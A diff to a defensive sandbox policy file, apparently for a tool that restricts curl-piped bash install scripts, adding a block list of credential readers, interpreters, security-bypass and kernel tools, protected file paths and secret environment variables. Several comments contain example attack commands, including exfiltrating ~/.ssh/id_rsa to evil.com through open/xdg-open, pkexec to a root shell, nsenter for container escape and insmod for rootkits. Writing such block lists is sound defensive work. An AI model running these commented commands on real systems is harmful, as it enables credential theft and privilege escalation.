@@ -1,5 +1,4 @@
 version: 1
-includes: [base]
 
 # Auto-policy for bash/sh install scripts (curl ... | bash)
 # Customise: ~/.config/malwi/policies/bash-install.yaml
@@ -11,9 +10,6 @@ includes: [base]
 # Key difference from the default policy: curl/wget are ALLOWED because
 # install scripts legitimately download files. Protection is provided by
 # file/envvar/network restrictions and blocking dangerous tools.
-#
-# Inherits from base: envvars, symbols, network deny/warn.
-# Extra file protections (shell profiles, persistence dirs, browser data).
 
 # Allow download tools and common install utilities.
 # Deny interpreters, persistence, privilege escalation, obfuscation,
@@ -179,6 +175,59 @@ commands:
     - kill
     - pkill
     - killall
+    # Scripting interpreters — can execute arbitrary code, bypassing traced process
+    - osascript    # AppleScript/JXA: shell access, file I/O, network via scripting bridge
+    - swift        # Swift interpreter: full system access
+    - java         # JVM: arbitrary code execution, network I/O
+    # Data exfiltration — can leak sensitive data without network hooks seeing it
+    - open         # opens URLs in browser: open "http://evil.com/?d=$(cat ~/.ssh/id_rsa)"
+    - sqlite3      # queries browser credential DBs (Chrome Login Data, Safari, etc.)
+    # Credential/config readers — read secrets from macOS system stores
+    - plutil       # reads plist files: app tokens, Safari data, stored credentials
+    - defaults     # reads macOS preferences: OAuth tokens, login items, app secrets
+    # Linux scripting interpreters — execute arbitrary code bypassing traced process
+    - gjs          # GNOME JavaScript: D-Bus, file I/O, network via GLib/Gio
+    # D-Bus access — invoke privileged system services (polkit, systemd, NetworkManager)
+    - dbus-send    # send D-Bus messages: reconfigure networking, read secrets
+    - gdbus        # GLib D-Bus tool: gdbus call --system reads GNOME Keyring entries
+    - busctl       # systemd D-Bus: busctl call org.freedesktop.systemd1 starts/stops services
+    # Data exfiltration — opens URLs in browser, bypassing network hooks (Linux equivalent of open)
+    - xdg-open     # xdg-open "https://evil.com/?d=$(cat ~/.ssh/id_rsa)"
+    # Credential/config readers — access Linux desktop keyring and password stores
+    - secret-tool  # GNOME Keyring CLI: secret-tool lookup service github
+    - kwallet-query  # KDE Wallet CLI: kwallet-query -r entry kdewallet
+    - kwalletcli   # alternative KDE Wallet CLI
+    - keyctl       # Linux kernel keyring: keyctl read <key-id>
+    - pass         # password-store CLI: pass show email/gmail dumps passwords
+    # Reconnaissance — pre-indexed file search, finds *.pem, id_rsa instantly
+    - locate       # locate '*.pem' finds all credential files on disk
+    - mlocate      # alternative locate implementation
+    - plocate      # modern locate implementation
+    # Security bypass — disable Linux mandatory access controls
+    - setenforce   # disable SELinux: setenforce 0 sets Permissive mode
+    - aa-disable   # disable AppArmor profile: aa-disable /usr/bin/target
+    - apparmor_parser  # AppArmor management: apparmor_parser -R removes profile
+    - chattr       # file attributes: chattr -i /etc/passwd removes immutable flag
+    - setcap       # file capabilities: setcap cap_net_raw+ep binary grants raw net
+    - getcap       # recon: getcap -r / finds all capability-enabled binaries
+    - debugfs      # raw ext2/3/4 access, bypasses ALL file permissions and ACLs
+    - mount        # mount attacker NFS/CIFS or bind-mount for container escape
+    - chroot       # change root filesystem, escape containers
+    - unshare      # create namespaces: unshare -n bypasses network restrictions
+    - nsenter      # enter namespaces: nsenter -t 1 -m -p escapes containers
+    # Kernel/module manipulation — rootkit installation, security module removal
+    - insmod       # load kernel module from file: insmod rootkit.ko
+    - modprobe     # load kernel module by name (resolves dependencies)
+    - rmmod        # remove kernel module: rmmod apparmor disables MAC
+    - kexec        # load new kernel, bypasses secure boot and all controls
+    # Process memory/injection — dump credentials from running processes via ptrace
+    - strace       # trace syscalls: strace -e read -p <pid> dumps all reads
+    - ltrace       # trace library calls, captures function arguments
+    - gdb          # attach to process, inject code, dump memory regions
+    - gcore        # dump full process core: gcore <pid> extracts all memory
+    # Privilege escalation — Linux-specific
+    - pkexec       # PolicyKit escalation: pkexec bash opens root shell (CVE-2021-4034)
+    - newgrp       # change group: newgrp docker gains container access
   review:
     # Privilege escalation (S6.1) — review instead of block because
     # legitimate installers (e.g. Homebrew) need sudo for system-level setup.
@@ -186,11 +235,26 @@ commands:
     - su
     - doas
 
-# Extra file protections beyond base (shell profiles, persistence, browser, proc).
-# Base already provides: credentials (~/.ssh, ~/.aws, *.pem, etc.),
-# Linux keyrings, autostart dirs, ld.so.preload.
+# Protect sensitive files from exfiltration.
 files:
   deny:
+    # Credentials and keys
+    - "~/.ssh/**"
+    - "*/.ssh/**"
+    - "~/.aws/**"
+    - "*/.aws/**"
+    - "~/.config/gcloud/**"
+    - "~/.azure/**"
+    - "~/.gnupg/**"
+    - "~/.config/gh/**"
+    - "*/.kube/config"
+    - "*.pem"
+    - "*.key"
+    - "*id_rsa*"
+    - "*id_ed25519*"
+    # Linux credential stores
+    - "~/.local/share/keyrings/**"
+    - "~/.local/share/kwalletd/**"
     # Shell profiles (S3.1) — attackers modify for persistence
     - "~/.bashrc"
     - "~/.bash_profile"
@@ -198,11 +262,30 @@ files:
     - "~/.zprofile"
     - "~/.profile"
     - "~/.login"
-    # Persistence directories (S3.2)
-    - "~/Library/LaunchAgents/*"
+    # macOS persistence
+    - "~/Library/LaunchAgents/**"
     - "~/Library/LaunchDaemons/*"
+    - "/Library/LaunchDaemons/**"
+    - "/Library/LaunchAgents/**"
+    # macOS credential/browser stores
+    - "~/Library/Keychains/**"
+    - "~/Library/Cookies/**"
+    - "~/Library/Application Support/Google/Chrome/*/Login Data*"
+    - "~/Library/Application Support/Firefox/Profiles/**/*.sqlite"
+    # Linux autostart/systemd
+    - "~/.config/autostart/**"
+    - "~/.config/systemd/user/**"
+    # Linux persistence
     - "/etc/cron*"
     - "/etc/systemd/**"
+    - "/etc/udev/rules.d/**"
+    - "/etc/init.d/**"
+    - "/var/spool/cron/**"
+    - "~/.crontab"
+    # System-level preload (rootkit vector)
+    - "/etc/ld.so.preload"
+    - "/etc/ld.so.conf"
+    - "/etc/ld.so.conf.d/**"
     # Git hooks (S3.3) — hidden persistence via hook scripts
     - ".git/hooks/*"
     - "*/.git/hooks/*"
@@ -213,20 +296,44 @@ files:
     - "*/Google/Chrome/**"
     - "*/Firefox/**"
     - "*/Safari/**"
+    # Linux browser stores
+    - "~/.mozilla/firefox/**/*.sqlite"
+    - "~/.config/google-chrome/*/Login Data*"
     # Shared memory (S5.3) — fileless staging
     - "/dev/shm/*"
-    # Linux persistence (L8)
-    - "/etc/udev/rules.d/**"       # udev rules (persistence via device events)
-    - "/etc/init.d/**"             # SysV init scripts
-    - "/var/spool/cron/**"         # cron spool directory
-    - "/etc/ld.so.conf"            # library search paths (hijack)
-    - "/etc/ld.so.conf.d/**"       # library search path fragments
     # Process information (credential dumping)
-    - "/proc/*/environ"            # other processes' env vars (secrets)
-    - "/proc/*/maps"               # process memory maps (aids dumping)
-    - "/proc/*/mem"                # raw process memory (credential extraction)
+    - "/proc/*/environ"
+    - "/proc/*/maps"
+    - "/proc/*/mem"
 
 # Restrict to HTTP/HTTPS protocols only (no raw TCP/UDP/WebSocket).
-# Base provides cloud metadata deny + anonymity domain warnings.
 network:
   protocols: [https, http]
+
+# Warn on dangerous native symbols (credential interception, symlink bypass, raw syscall).
+# Network symbols (socket, connect, sendto, bind) excluded — bash-install needs curl/wget.
+symbols:
+  warn:
+    - getpass
+    - crypt
+    - symlink
+    - link
+    - syscall
+
+# Protect sensitive environment variables.
+envvars:
+  deny:
+    - "*SECRET*"
+    - "*TOKEN*"
+    - "*PASSWORD*"
+    - "*API_KEY*"
+    - "*PRIVATE_KEY*"
+    - "AWS_*"
+    - "GITHUB_*"
+    - "GCP_*"
+    - "AZURE_*"
+    - "OPENAI_*"
+    - "ANTHROPIC_*"
+    - HF_TOKEN
+    - DYLD_INSERT_LIBRARIES
+    - LD_PRELOAD
